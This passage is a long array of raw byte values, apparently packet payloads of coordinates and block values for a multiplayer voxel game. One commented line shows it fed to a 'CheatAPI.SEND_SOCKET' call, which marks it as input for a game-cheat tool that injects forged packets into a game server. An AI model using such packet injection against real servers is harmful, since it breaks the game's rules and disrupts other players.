5,7,7,0,32,0,1,255,236,7,7,0,32,0,1,255,237,7,7,0,32,0,1,255,238,7,7,0,32,0,1,255,239,7,7,0,32,0,1,255,240,7,7,0,32,0,1,255,241,7,7,0,32,0,1,255,242,7,7,0,32,0,1,255,243,7,7,0,32,0,1,255,244,7,7,0,32,0,1,255,245,7,7,0,32,0,1,255,246,7,7,0,32,0,1,255,247,7,7,0,32,0,1,255,248,7,7,0,32,0,1,255,249,7,7,0,32,0,2,255,231,7,7,0,32,0,2,255,232,7,7,0,32,0,2,255,233,7,7,0,32,0,2,255,234,7,7,0,32,0,2,255,235,7,7,0,32,0,2,255,236,7,7,0,32,0,2,255,237,7,7,0,32,0,2,255,238,7,7,0,32,0,2,255,239,7,7,0,32,0,2,255,240,7,7,0,32,0,2,255,241,7,7,0,32,0,2,255,242,7,7,0,32,0,2,255,243,7,7,0,32,0,2,255,244,7,7,0,32,0,2,255,245,7,7,0,32,0,2,255,246,7,7,0,32,0,2,255,247,7,7,0,32,0,2,255,248,7,7,0,32,0,2,255,249,7,7,0,32,0,3,255,249,7,7,0,32,0,3,255,248,7,7,0,32,0,3,255,247,7,7,0,32,0,3,255,246,7,7,0,32,0,3,255,245,7,7,0,32,0,3,255,244,7,7,0,32,0,3,255,243,7,7,0,32,0,3,255,242,7,7,0,32,0,3,255,241,7,7,0,32,0,3,255,240,7,7,0,32,0,3,255,239,7,7,0,32,0,3,255,238,7,7,0,32,0,3,255,237,7,7,0,32,0,3,255,236,7,7,0,32,0,3,255,235,7,7,0,32,0,3,255,234,7,7,0,32,0,3,255,233,7,7,0,32,0,3,255,232,7,7,0,32,0,3,255,231,7,7,0,32,0,4,255,232,7,7,0,32,0,4,255,233,7,7,0,32,0,4,255,234,7,7,0,32,0,4,255,235,7,7,0,32,0,4,255,236,7,7,0,32,0,4,255,237,7,7,0,32,0,4,255,238,7,7,0,32,0,4,255,239,7,7,0,32,0,4,255,240,7,7,0,32,0,4,255,241,7,7,0,32,0,4,255,242,7,7,0,32,0,4,255,243,7,7,0,32,0,4,255,244,7,7,0,32,0,4,255,245,7,7,0,32,0,4,255,246,7,7,0,32,0,4,255,247,7,7,0,32,0,4,255,248,7,7,0,15,0,2,255,250,75,7,0,15,0,3,255,250,75,7,0,15,0,4,255,250,75,7,0,15,0,1,255,244,7,7,0,15,0,1,255,245,7,7,0,15,0,1,255,246,15,7,0,15,0,1,255,247,15,7,0,15,0,1,255,248,15,7,0,15,0,1,255,249,15,7,0,15,0,2,255,244,6,20,45,49,24,4,29,25,0,7,0,15,0,2,255,245,7,7,0,15,0,2,255,246,7,7,0,15,0,2,255,247,7,7,0,15,0,2,255,248,7,7,0,15,0,2,255,249,7,7,0,15,0,3,255,244,7,7,0,15,0,3,255,245,7,7,0,15,0,3,255,246,7,7,0,15,0,3,255,247,7,7,0,15,0,3,255,248,7,7,0,15,0,3,255,249,7,7,0,15,0,4,255,244,11,7,0,15,0,4,255,245,11,7,0,15,0,4,255,246,11,7,0,15,0,4,255,247,11,7,0,15,0,4,255,248,11,7,0,15,0,4,255,249,75,7,0,7,0,4,255,238,11,7,0,7,0,4,255,239,11,7,0,7,0,4,255,240,11,7,0,7,0,4,255,241,11,7,0,7,0,4,255,242,11,7,0,7,0,5,255,239,7,7,0,7,0,5,255,241,7,7,255,255,0,5,255,231,7,15,255,253,0,5,255,231,7,15,255,255,0,5,255,249,7,10,255,253,0,5,255,249,7,10,255,244,0,4,255,238,11,2,255,244,0,4,255,239,11,2,255,244,0,4,255,240,11,2,255,244,0,4,255,241,11,2,255,244,0,4,255,242,11,2,255,237,0,4,255,239,11,2,255,245,0,5,255,239,7,2,255,245,0,5,255,241,7,2,255,237,0,4,255,240,11,2,255,237,0,4,255,241,11,2,0,14,0,4,255,238,15,7,0,14,0,4,255,239,11,7,0,14,0,4,255,240,11,7,0,14,0,4,255,241,11,7,0,14,0,4,255,242,15,7,0,15,0,5,255,235,7,7,0,15,0,5,255,233,7,7,0,15,0,5,255,231,7,7,0,16,0,5,255,230,7,7,0,18,0,5,255,230,7,7,0,20,0,5,255,230,7,7,0,22,0,5,255,230,7,7,0,24,0,5,255,230,7,7,0,26,0,5,255,230,7,7,0,28,0,5,255,230,7,7,0,30,0,5,255,230,7,7,0,32,0,5,255,230,7,7,0,32,0,5,255,232,7,7,0,32,0,5,255,234,7,7,0,32,0,5,255,236,7,7,0,32,0,5,255,238,7,7,0,32,0,5,255,240,7,7,0,32,0,5,255,242,7,7,0,32,0,5,255,244,7,7,0,32,0,5,255,246,7,7,0,32,0,5,255,248,7,7,0,32,0,5,255,250,7,7,0,30,0,5,255,250,7,7,0,28,0,5,255,250,7,7,0,26,0,5,255,250,7,7,0,24,0,5,255,250,7,7,0,22,0,5,255,250,7,7,0,20,0,5,255,250,7,7,0,18,0,5,255,250,7,7,0,16,0,5,255,250,7,7,0,15,0,5,255,249,7,7,0,15,0,5,255,245,7,7,0,15,0,5,255,247,7,7,0,3,0,5,0,1,7,10,0,5,0,5,0,1,7,10,0,7,0,5,0,1,7,10,0,8,0,5,0,2,7,10,0,8,0,5,0,4,7,10,0,8,0,5,0,6,7,10,0,8,0,5,0,8,7,10,0,8,0,5,0,10,7,10,0,8,0,5,0,12,7,10,0,8,0,5,0,14,7,10,0,8,0,5,0,16,7,10,0,8,0,5,0,18,7,10,0,6,0,5,0,18,7,10,0,4,0,5,0,18,7,10,0,2,0,5,0,18,7,10,0,0,0,5,0,18,7,10,255,254,0,5,0,18,7,10,255,252,0,5,0,18,7,10,255,250,0,5,0,18,7,10,255,248,0,5,0,18,7,10,255,246,0,5,0,18,7,10,255,244,0,5,0,18,7,10,255,244,0,5,0,16,7,10,255,244,0,5,0,14,7,10,255,244,0,5,0,12,7,10,255,244,0,5,0,10,7,10,255,244,0,5,0,8,7,10,255,244,0,5,0,6,7,10,255,244,0,5,0,4,7,10,255,244,0,5,0,2,7,10,255,245,0,5,0,1,7,10,255,247,0,5,0,1,7,10,255,249,0,5,0,1,7,10,255,237,0,5,255,245,7,2,255,237,0,5,255,247,7,2,255,237,0,5,255,249,7,2,255,236,0,5,255,250,7,2,255,234,0,5,255,250,7,2,255,232,0,5,255,250,7,2,255,230,0,5,255,250,7,2,255,228,0,5,255,250,7,2,255,226,0,5,255,250,7,2,255,224,0,5,255,250,7,2,255,222,0,5,255,250,7,2,255,220,0,5,255,250,7,2,255,220,0,5,255,248,7,2,255,220,0,5,255,246,7,2,255,220,0,5,255,244,7,2,255,220,0,5,255,242,7,2,255,220,0,5,255,240,7,2,255,220,0,5,255,238,7,2,255,220,0,5,255,236,7,2,255,220,0,5,255,234,7,2,255,220,0,5,255,232,7,2,255,220,0,5,255,230,7,2,255,222,0,5,255,230,7,2,255,224,0,5,255,230,7,2,255,226,0,5,255,230,7,2,255,228,0,5,255,230,7,2,255,230,0,5,255,230,7,2,255,232,0,5,255,230,7,2,255,234,0,5,255,230,7,2,255,236,0,5,255,230,7,2,255,237,0,5,255,231,7,2,255,237,0,5,255,233,7,2,255,237,0,5,255,235,7,2,0,3,0,5,255,223,7,15,0,5,0,5,255,223,7,15,0,7,0,5,255,223,7,15,0,8,0,5,255,222,7,15,0,8,0,5,255,220,7,15,0,8,0,5,255,218,7,15,0,8,0,5,255,216,7,15,0,8,0,5,255,214,7,15,0,8,0,5,255,212,7,15,0,8,0,5,255,210,7,15,0,8,0,5,255,208,7,15,0,8,0,5,255,206,7,15,0,6,0,5,255,206,7,15,0,4,0,5,255,206,7,15,0,2,0,5,255,206,7,15,0,0,0,5,255,206,7,15,255,254,0,5,255,206,7,15,255,252,0,5,255,206,7,15,255,250,0,5,255,206,7,15,255,248,0,5,255,206,7,15,255,246,0,5,255,206,7,15,255,244,0,5,255,206,7,15,255,244,0,5,255,208,7,15,255,244,0,5,255,210,7,15,255,244,0,5,255,212,7,15,255,244,0,5,255,214,7,15,255,244,0,5,255,216,7,15,255,244,0,5,255,218,7,15,255,244,0,5,255,220,7,15,255,244,0,5,255,222,7,15,255,245,0,5,255,223,7,15,255,247,0,5,255,223,7,15,255,249,0,5,255,223,7,15,0,4,0,1,255,222,23,15,255,245,0,1,255,220,18,0,100,124,24,4,104,100,0,15,255,249,0,1,255,222,6,20,20,24,24,4,104,100,0,15,255,249,0,1,255,221,6,20,20,24,24,4,104,100,0,15,255,249,0,1,255,220,6,24,24,24,24,4,104,104,0,15,0,4,0,1,255,221,23,15,0,4,0,1,255,220,18,24,124,124,24,4,104,100,0,15,0,3,0,1,255,222,6,120,120,124,124,4,104,100,0,15,0,3,0,1,255,221,6,120,120,124,124,4,104,100,0,15,0,3,0,1,255,220,6,124,124,124,124,4,104,100,100,15,255,235,0,1,255,249,15,2,255,235,0,1,255,248,15,2,255,235,0,1,255,247,15,2,255,235,0,1,255,246,15,2,255,234,0,1,255,249,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,248,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,247,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,246,6,0,120,124,4,4,104,100,0,2,255,235,0,1,255,245,10,0,100,124,24,4,104,100,0,2,255,234,0,1,255,245,6,100,100,124,124,4,104,100,100,2,255,235,0,1,255,231,15,2,255,235,0,1,255,232,15,2,255,235,0,1,255,233,15,2,255,235,0,1,255,234,15,2,255,235,0,1,255,235,10,20,120,104,4,4,104,100,0,2,255,234,0,1,255,231,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,232,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,233,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,234,6,0,120,124,4,4,104,100,0,2,255,234,0,1,255,235,6,0,120,120,0,0,104,100,0,2,0,4,0,1,0,2,23,10,0,4,0,1,0,3,23,10,0,4,0,1,0,4,18,20,120,104,4,4,104,100,0,10,0,3,0,1,0,2,6,120,120,124,124,4,104,100,0,10,0,3,0,1,0,3,6,120,120,124,124,4,104,100,0,10,0,3,0,1,0,4,6,120,120,120,120,0,104,100,0,10,255,249,0,1,0,2,6,20,100,104,24,4,104,100,0,10,255,249,0,1,0,3,6,20,100,104,24,4,104,100,0,10,255,245,0,1,0,4,18,20,120,104,4,4,104,100,0,10,255,249,0,1,0,4,6,20,20,4,4,4,4,100,0,10,0,18,0,1,255,231,6,20,100,104,24,4,104,100,0,7,0,18,0,1,255,232,6,20,100,104,24,4,104,100,0,7,0,18,0,1,255,233,6,20,100,104,24,4,104,100,0,7,0,18,0,1,255,234,6,20,100,104,24,4,104,100,0,7,0,16,0,1,255,235,10,20,120,104,4,4,104,100,0,7,0,18,0,1,255,235,6,20,20,4,4,4,4,100,0,7,0,18,0,1,255,249,6,20,100,104,24,4,104,100,0,7,0,16,0,1,255,245,10,0,100,124,24,4,104,100,0,7,0,18,0,1,255,245,6,0,0,24,24,4,104,0,0,7,0,18,0,1,255,248,6,20,100,104,24,4,104,100,0,7,0,18,0,1,255,247,6,20,100,104,24,4,104,100,0,7,0,18,0,1,255,246,6,20,100,104,24,4,104,100,0,7,0,27,0,1,255,240,14,15,115,119,19,4,104,100,0,7,0,27,0,1,255,239,14,15,115,119,19,4,104,100,0,7,0,27,0,1,255,241,14,15,115,119,19,4,104,100,0,7,255,253,0,1,0,15,14,15,115,119,19,4,104,100,0,10,255,253,0,1,0,14,14,15,115,119,19,4,104,100,0,10,255,253,0,1,0,13,14,15,115,119,19,4,104,100,0,10,255,223,0,1,255,240,14,15,115,119,19,4,104,100,0,2,255,223,0,1,255,241,14,15,115,119,19,4,104,100,0,2,255,223,0,1,255,239,14,15,115,119,19,4,104,100,0,2,255,253,0,1,255,209,14,15,115,119,19,4,104,100,0,15,255,253,0,1,255,210,14,15,115,119,19,4,104,100,0,15,255,253,0,1,255,211,14,15,115,119,19,4,104,100,0,15,0,7,0,4,255,207,11,15,0,7,0,4,255,208,11,15,0,7,0,4,255,209,11,15,0,7,0,4,255,210,11,15,0,7,0,4,255,211,11,15,0,7,0,4,255,212,11,15,0,7,0,4,255,213,11,15,0,7,0,4,255,214,11,15,0,7,0,4,255,215,11,15,0,7,0,4,255,216,11,15,0,7,0,4,255,217,11,15,0,7,0,4,255,218,11,15,0,7,0,4,255,219,11,15,0,7,0,4,255,220,11,15,0,7,0,4,255,221,11,15,0,7,0,4,0,17,11,10,0,7,0,4,0,16,11,10,0,7,0,4,0,15,11,10,0,7,0,4,0,14,11,10,0,7,0,4,0,13,11,10,0,7,0,4,0,12,11,10,0,7,0,4,0,11,11,10,0,7,0,4,0,10,11,10,0,7,0,4,0,9,11,10,0,7,0,4,0,8,11,10,0,7,0,4,0,7,11,10,0,7,0,4,0,6,11,10,0,7,0,4,0,5,11,10,0,7,0,4,0,4,11,10,0,7,0,4,0,3,11,10,0,0,0,4,0,2,39,10,255,236,0,4,255,248,11,2,255,236,0,4,255,247,11,2,255,236,0,4,255,246,11,2,255,236,0,4,255,245,11,2,255,236,0,4,255,244,11,2,255,236,0,4,255,243,43,2,255,236,0,4,255,242,15,2,255,236,0,4,255,232,11,2,255,236,0,4,255,233,11,2,255,236,0,4,255,234,11,2,255,236,0,4,255,235,11,2,255,236,0,4,255,236,11,2,255,236,0,4,255,237,43,2,255,236,0,4,255,238,15,2,0,0,0,4,255,222,39,15,255,253,0,20,255,240,10,20,120,124,24,19,119,115,15,23,255,253,0,20,255,241,10,20,120,124,24,19,119,115,15,23,0,37,0,245,255,208,27,23,0,37,0,246,255,208,23,23,0,37,0,246,255,209,7,23,0,37,0,247,255,208,19,23,0,41,0,247,255,208,6,20,95,99,24,4,79,75,0,23,0,43,0,247,255,208,19,23,0,37,0,248,255,208,43,23,0,37,0,246,255,210,7,23,0,37,0,246,255,211,7,23,0,37,0,246,255,212,7,23,0,37,0,246,255,213,7,23,0,37,0,246,255,214,7,23,0,37,0,246,255,215,7,23,0,37,0,246,255,216,43,23,0,37,0,247,255,216,43,23,0,37,0,248,255,216,43,23,0,37,0,249,255,208,43,23,0,37,0,249,255,216,43,23,0,37,0,247,255,209,7,23,0,37,0,247,255,210,7,23,0,37,0,247,255,211,7,23,0,37,0,247,255,212,7,23,0,37,0,247,255,213,7,23,0,37,0,247,255,214,7,23,0,37,0,247,255,215,7,23,0,37,0,248,255,209,7,23,0,37,0,248,255,210,7,23,0,37,0,248,255,211,7,23,0,37,0,248,255,212,7,23,0,37,0,248,255,213,7,23,0,37,0,248,255,214,7,23,0,37,0,248,255,215,7,23,0,37,0,249,255,209,43,23,0,37,0,249,255,210,43,23,0,37,0,249,255,211,43,23,0,37,0,249,255,212,43,23,0,37,0,249,255,213,43,23,0,37,0,249,255,214,43,23,0,37,0,249,255,215,43,23,0,46,0,246,255,209,7,23,0,43,0,245,255,208,7,15,0,46,0,246,255,210,7,23,0,46,0,246,255,211,7,23,0,46,0,246,255,212,7,23,100,111,1,133,98,0)
//  CheatAPI.SEND_SOCKET(243,4,62,0,3,245,120,0,0,19,136,0,46,0,246,255,213,7,23,0,46,0,246,255,214,7,23,0,46,0,246,255,215,7,23,0,46,0,247,255,215,7,23,0,46,0,247,255,214,7,23,0,46,0,247,255,213,7,23,0,46,0,247,255,212,7,23,0,46,0,247,255,211,7,23,0,46,0,247,255,210,7,23,0,46,0,247,255,209,7,23,0,46,0,248,255,210,7,23,0,46,0,248,255,211,7,23,0,46,0,248,255,212,7,23,0,46,0,248,255,213,7,23,0,46,0,248,255,214,7,23,0,46,0,248,255,215,7,23,0,46,0,248,255,209,7,23,0,43,0,246,255,207,19,23,0,36,0,246,255,199,14,20,120,123,23,3,103,100,0,23,0,36,0,246,255,206,14,21,121,124,24,4,104,101,1,23,0,36,0,247,255,206,14,21,121,124,24,4,104,101,1,23,0,36,0,247,255,199,14,20,120,123,23,3,103,100,0,23,0,36,0,248,255,199,19,23,0,39,0,246,255,200,6,45,120,124,49,29,104,100,25,23,0,36,0,248,255,206,35,23,0,39,0,246,255,206,6,21,45,120,24,4,100,25,1,23,0,39,0,246,255,205,6,45,120,124,49,29,104,100,25,23,0,39,0,246,255,204,6,45,120,124,49,29,104,100,25,23,0,39,0,246,255,203,6,45,120,124,49,29,104,100,25,23,0,39,0,246,255,202,6,45,120,124,49,29,104,100,25,23,0,39,0,246,255,201,6,45,120,124,49,29,104,100,25,23,0,39,0,247,255,199,6,20,124,49,23,3,29,104,0,23,0,39,0,247,255,206,6,21,45,120,24,4,100,25,1,23,0,39,0,247,255,205,6,45,120,124,49,29,104,100,25,23,0,39,0,247,255,204,6,45,120,124,49,29,104,100,25,23,0,39,0,247,255,203,6,45,120,124,49,29,104,100,25,23,0,39,0,247,255,202,6,45,120,124,49,29,104,100,25,23,0,39,0,247,255,201,6,45,120,124,49,29,104,100,25,23,0,39,0,247,255,200,6,45,120,124,49,29,104,100,25,23,0,32,0,242,255,198,51,23,0,25,0,245,255,198,79,23,0,25,0,246,255,198,47,23,0,43,0,242,255,204,6,20,120,124,24,19,119,115,15,23,0,43,0,243,255,204,7,23,0,42,0,246,255,207,6,20,120,124,24,19,119,115,15,23,255,255,0,20,255,240,6,23,123,124,24,14,119,118,13,7,255,255,0,20,255,241,6,20,120,121,21,11,116,115,10,7,255,254,0,20,255,242,6,20,45,49,24,19,44,35,10,10,255,253,0,20,255,242,6,95,120,124,99,94,119,110,85,10,255,252,0,20,255,241,6,20,120,121,21,16,111,110,15,2,255,252,0,20,255,240,6,23,123,124,24,19,114,113,18,2,255,254,0,20,255,239,6,20,45,49,24,14,39,40,15,15,255,253,0,20,255,239,6,95,120,124,99,89,114,115,90,15,0,42,0,246,255,208,6,23,123,124,24,4,104,103,3,23,255,252,0,21,255,241,6,5,100,101,6,1,101,100,0,2,255,252,0,21,255,240,6,8,103,104,9,4,104,103,3,2,255,253,0,21,255,242,6,75,100,109,84,79,104,100,75,10,255,254,0,21,255,242,6,0,25,34,9,4,29,25,0,10,255,253,0,21,255,239,6,80,105,104,79,79,104,100,75,15,255,254,0,21,255,239,6,5,30,29,4,4,29,25,0,15,255,255,0,21,255,241,6,0,105,106,1,1,101,100,0,7,255,255,0,21,255,240,6,3,108,109,4,4,104,103,3,7,0,44,0,245,255,208,15,23,0,37,0,245,255,216,43,23,0,37,0,245,255,215,43,23,0,37,0,245,255,214,43,23,0,37,0,245,255,213,43,23,0,37,0,245,255,212,43,23,0,37,0,245,255,211,43,23,0,37,0,245,255,210,43,23,0,37,0,245,255,209,43,23,0,40,0,242,255,206,18,20,120,124,24,19,119,115,15,23,0,40,0,242,255,205,6,20,120,124,24,19,119,115,15,23,0,32,0,244,255,198,51,23,0,38,0,243,255,203,6,22,124,124,24,4,104,104,2,23,0,43,0,244,255,201,7,23,0,43,0,244,255,202,7,23,0,40,0,242,255,203,6,15,115,119,19,4,104,100,0,23,0,41,0,242,255,203,15,23,0,43,0,244,255,203,7,23,0,43,0,244,255,204,7,23,0,38,0,243,255,204,15,23,0,38,0,244,255,203,6,22,124,124,24,4,104,104,2,23,0,43,0,242,255,205,6,20,120,124,24,19,119,115,15,23,0,38,0,242,255,204,14,20,120,124,24,19,119,115,15,23,0,43,0,244,255,200,7,23,0,43,0,244,255,199,7,23,0,43,0,243,255,199,7,23,255,205,0,163,0,14,7,23,255,206,0,163,0,14,6,20,121,124,24,4,104,101,0,23,255,209,0,163,0,13,7,23,255,205,0,164,0,13,23,23,255,207,0,163,0,14,6,21,121,124,24,4,104,101,1,23,255,205,0,164,0,12,23,23,255,208,0,163,0,14,6,21,70,74,24,4,54,50,1,23,255,205,0,162,0,13,23,23,255,205,0,162,0,14,23,23,255,205,0,162,0,12,23,23,255,205,0,163,0,12,7,23,255,209,0,163,0,12,7,23,255,205,0,162,0,11,23,23,255,205,0,163,0,13,7,23,255,205,0,164,0,14,23,23,255,208,0,163,0,13,6,70,120,124,74,54,104,100,50,23,255,208,0,163,0,12,6,22,120,74,23,3,54,100,2,23,255,209,0,163,0,14,7,23,255,205,0,163,0,11,7,23,255,209,0,163,0,10,7,23,255,205,0,164,0,11,23,23,255,205,0,162,0,10,23,23,255,205,0,163,0,10,7,23,255,205,0,164,0,10,7,23,255,205,0,165,0,10,23,23,255,207,0,164,0,10,15,23,255,209,0,163,0,11,7,23,255,205,0,163,0,9,23,23,255,205,0,164,0,9,23,23,255,205,0,162,0,9,23,23,0,36,0,247,255,203,6,45,70,74,49,29,54,50,25,2,0,36,0,248,255,204,19,23,0,36,0,248,255,203,19,23,0,39,0,246,255,199,6,20,124,49,23,3,29,104,0,23,0,36,0,246,255,203,6,45,70,74,49,29,54,50,25,2,0,36,0,248,255,205,35,23,0,26,0,245,255,214,43,23,0,25,0,245,255,199,79,23,0,26,0,246,255,214,7,23,0,25,0,245,255,200,79,23,0,26,0,247,255,214,7,23,0,25,0,245,255,201,79,23,0,26,0,248,255,214,43,23,0,25,0,245,255,202,43,23,0,35,0,245,255,203,6,22,122,124,24,4,104,102,2,23,0,36,0,245,255,202,35,23,0,25,0,245,255,203,43,23,0,35,0,245,255,202,6,20,120,122,22,2,102,100,0,23,0,36,0,245,255,203,35,23,0,33,0,246,255,208,6,20,45,49,24,4,29,25,0,23,0,25,0,245,255,204,79,23,0,33,0,247,255,208,6,20,45,49,24,4,29,25,0,23,0,25,0,245,255,205,79,23,0,25,0,245,255,206,79,23,0,35,0,246,255,199,6,70,120,124,74,54,104,100,50,2,0,35,0,247,255,199,6,70,120,124,74,54,104,100,50,2,0,35,0,247,255,206,6,70,120,124,74,54,104,100,50,2,0,35,0,246,255,206,6,70,120,124,74,54,104,100,50,2,0,35,0,246,255,207,6,45,120,124,49,29,104,100,25,23,0,36,0,246,255,207,27,23,0,35,0,248,255,207,6,45,120,124,49,29,104,100,25,23,0,36,0,248,255,207,47,23,0,32,0,247,255,208,6,45,120,121,46,26,101,100,25,23,0,32,0,246,255,208,6,45,120,121,46,26,101,100,25,23,0,35,0,247,255,207,6,45,120,124,49,29,104,100,25,23,0,36,0,247,255,207,47,23,0,25,0,245,255,207,91,23,0,36,0,246,255,204,6,45,70,72,47,27,52,50,25,2,0,26,0,245,255,208,43,23,0,30,0,246,255,208,6,45,120,121,46,26,101,100,25,23,0,28,0,246,255,208,6,45,120,121,46,26,101,100,25,23,0,36,0,247,255,204,6,45,70,72,47,27,52,50,25,2,0,26,0,246,255,208,7,23,0,30,0,247,255,208,6,45,120,121,46,26,101,100,25,23,0,28,0,247,255,208,6,45,120,121,46,26,101,100,25,23,0,36,0,246,255,201,6,47,72,74,49,29,54,52,27,2,0,26,0,247,255,208,7,23,0,36,0,247,255,201,6,47,72,74,49,29,54,52,27,2,0,26,0,248,255,208,43,23,0,34,0,247,255,214,6,95,120,124,24,4,104,100,75,2,0,33,0,246,255,213,6,23,48,49,24,4,29,28,3,23,0,33,0,247,255,214,6,20,45,124,24,4,104,25,0,2,0,31,0,246,255,213,6,23,48,49,24,4,29,28,3,23,0,31,0,246,255,208,6,20,45,49,24,4,29,25,0,23,0,31,0,247,255,208,6,20,45,49,24,4,29,25,0,23,0,29,0,246,255,208,6,20,45,49,24,4,29,25,0,23,0,29,0,247,255,208,6,20,45,49,24,4,29,25,0,23,0,33,0,246,255,214,6,20,45,124,24,4,104,25,0,2,0,33,0,247,255,210,6,20,45,49,24,4,29,25,0,23,0,33,0,247,255,213,6,23,48,49,24,4,29,28,3,23,0,33,0,247,255,211,6,20,45,49,24,4,29,25,0,23,0,31,0,246,255,209,6,20,45,49,24,4,29,25,0,23,0,31,0,246,255,210,6,20,45,49,24,4,29,25,0,23,0,31,0,246,255,211,6,20,45,49,24,4,29,25,0,23,0,31,0,247,255,209,6,20,45,49,24,4,29,25,0,23,0,31,0,247,255,210,6,20,45,49,24,4,29,25,0,23,0,31,0,247,255,211,6,20,45,49,24,4,29,25,0,23,0,29,0,246,255,209,6,20,45,49,24,4,29,25,0,23,0,29,0,246,255,210,6,20,45,49,24,4,29,25,0,23,0,29,0,246,255,211,6,20,45,49,24,4,29,25,0,23,0,29,0,247,255,209,6,20,45,49,24,4,29,25,0,23,0,29,0,247,255,210,6,20,45,49,24,4,29,25,0,23,0,29,0,247,255,211,6,20,45,49,24,4,29,25,0,23,0,26,0,245,255,209,43,23,0,26,0,245,255,210,43,23,0,26,0,245,255,211,43,23,0,26,0,245,255,212,43,23,0,26,0,245,255,213,43,23,0,33,0,246,255,211,6,20,45,49,24,4,29,25,0,23,0,33,0,246,255,209,6,20,45,49,24,4,29,25,0,23,0,33,0,247,255,209,6,20,45,49,24,4,29,25,0,23,0,33,0,246,255,210,6,20,45,49,24,4,29,25,0,23,0,29,0,246,255,213,6,23,48,49,24,4,29,28,3,23,0,30,0,246,255,213,6,98,123,124,99,79,104,103,78,23,0,29,0,247,255,213,6,23,48,49,24,4,29,28,3,23,0,30,0,246,255,214,6,95,120,124,24,4,104,100,75,2,0,29,0,246,255,214,6,20,45,124,24,4,104,25,0,2,0,31,0,246,255,214,6,20,45,124,24,4,104,25,0,2,0,32,0,246,255,214,6,95,120,124,24,4,104,100,75,2,0,28,0,246,255,214,6,95,120,124,24,4,104,100,75,2,0,27,0,246,255,214,6,20,45,124,24,4,104,25,0,2,0,28,0,246,255,213,6,98,123,124,99,79,104,103,78,23,0,28,0,247,255,213,6,98,123,124,99,79,104,103,78,23,0,31,0,247,255,213,6,23,48,49,24,4,29,28,3,23,0,30,0,247,255,213,6,98,123,124,99,79,104,103,78,23,0,32,0,246,255,213,6,98,123,124,99,79,104,103,78,23,0,32,0,247,255,213,6,98,123,124,99,79,104,103,78,23,0,27,0,246,255,213,6,23,48,49,24,4,29,28,3,23,0,27,0,247,255,213,6,23,48,49,24,4,29,28,3,23,0,26,0,246,255,209,7,23,0,26,0,247,255,209,7,23,0,26,0,246,255,210,7,23,0,26,0,247,255,210,7,23,0,26,0,246,255,211,7,23,0,26,0,247,255,211,7,23,0,26,0,246,255,212,7,23,0,26,0,247,255,212,7,23,0,26,0,246,255,213,7,23,0,26,0,247,255,213,7,23,0,32,0,247,255,214,6,95,120,124,24,4,104,100,75,2,0,31,0,247,255,214,6,20,45,124,24,4,104,25,0,2,0,30,0,247,255,214,6,95,120,124,24,4,104,100,75,2,0,29,0,247,255,214,6,20,45,124,24,4,104,25,0,2,0,28,0,247,255,214,6,95,120,124,24,4,104,100,75,2,0,27,0,247,255,214,6,20,45,124,24,4,104,25,0,2,0,25,0,246,255,207,7,7,0,25,0,246,255,206,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,207,7,7,0,25,0,248,255,207,7,7,0,25,0,247,255,206,6,20,95,99,24,4,79,75,0,23,0,25,0,248,255,206,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,205,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,204,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,203,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,202,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,201,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,200,6,20,95,99,24,4,79,75,0,23,0,25,0,246,255,199,7,7,0,25,0,247,255,205,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,204,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,203,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,202,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,201,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,200,6,20,95,99,24,4,79,75,0,23,0,25,0,247,255,199,7,7,0,25,0,248,255,199,7,7,0,25,0,248,255,205,6,20,95,99,24,4,79,75,0,23,0,25,0,248,255,204,6,20,95,99,24,4,79,75,0,23,0,25,0,248,255,203,6,20,95,99,24,4,79,75,0,23,0,25,0,248,255,202,6,20,95,99,24,4,79,75,0,23,0,25,0,248,255,201,6,20,95,99,24,4,79,75,0,23,0,25,0,248,255,200,6,20,95,99,24,4,79,75,0,23,0,35,0,248,255,199,6,70,120,124,74,54,104,100,50,2,0,35,0,248,255,206,6,70,120,124,74,54,104,100,50,2,0,25,0,247,255,198,39,23,0,35,0,247,255,198,7,23,0,25,0,248,255,198,47,23,0,36,0,248,255,202,19,23,0,36,0,248,255,201,19,23,0,36,0,247,255,202,6,45,70,74,49,29,54,50,25,2,0,36,0,246,255,202,6,45,70,74,49,29,54,50,25,2,0,36,0,248,255,200,19,23,0,26,0,248,255,213,43,23,0,26,0,248,255,212,43,23,0,26,0,248,255,211,43,23,0,26,0,248,255,210,43,23,0,26,0,248,255,209,43,23,0,34,0,246,255,214,6,95,120,124,24,4,104,100,75,2,0,25,0,249,255,206,47,23,0,25,0,249,255,205,47,23,0,25,0,249,255,207,91,23,0,25,0,249,255,204,47,23,0,25,0,249,255,203,47,23,0,25,0,249,255,202,47,23,0,25,0,249,255,201,47,23,0,25,0,249,255,200,47,23,0,25,0,249,255,199,47,23,0,25,0,249,255,198,47,23,0,34,0,246,255,208,6,45,120,121,46,26,101,100,25,23,0,34,0,247,255,208,6,45,120,121,46,26,101,100,25,23,0,35,0,246,255,208,7,23,0,35,0,247,255,208,7,23,0,35,0,246,255,214,7,23,0,35,0,247,255,214,7,23,0,35,0,246,255,209,7,23,0,35,0,246,255,210,7,23,0,35,0,246,255,211,7,23,0,35,0,246,255,212,7,23,0,35,0,246,255,213,7,23,0,35,0,247,255,209,7,23,0,35,0,247,255,210,7,23,0,35,0,247,255,211,7,23,0,35,0,247,255,212,7,23,0,35,0,247,255,213,7,23,0,42,0,247,255,208,6,48,123,124,49,29,104,103,28,23,0,32,0,243,255,198,51,23,0,43,0,246,255,206,7,23,0,42,0,246,255,206,6,20,120,124,24,19,119,115,15,23,0,43,0,246,255,208,19,23,0,40,0,246,255,206,11,23,0,40,0,246,255,205,19,23,0,40,0,247,255,206,19,23,0,40,0,247,255,205,19,23,0,38,0,244,255,204,15,23,0,33,0,244,255,203,